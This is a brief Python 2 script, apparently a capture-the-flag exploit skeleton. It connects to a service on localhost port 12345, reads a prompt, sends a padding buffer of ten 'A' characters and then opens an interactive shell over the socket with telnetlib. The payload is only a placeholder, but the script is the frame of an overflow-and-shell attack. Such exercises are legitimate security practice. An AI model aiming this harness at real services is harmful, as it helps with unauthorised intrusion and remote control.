#!/usr/bin/python

import socket,struct,re,telnetlib

def sock(remoteip,remoteport):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((remoteip,remoteport))
	return s, s.makefile('rw',bufsize=0)

def shell(s):
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()


s,f = sock("localhost",12345)
buf = 'A' * 10;
readline = f.read(37);
print(readline)
print(buf)
f.write(buf+"\n")
readline = f.read(35);
print(readline)
shell(s)
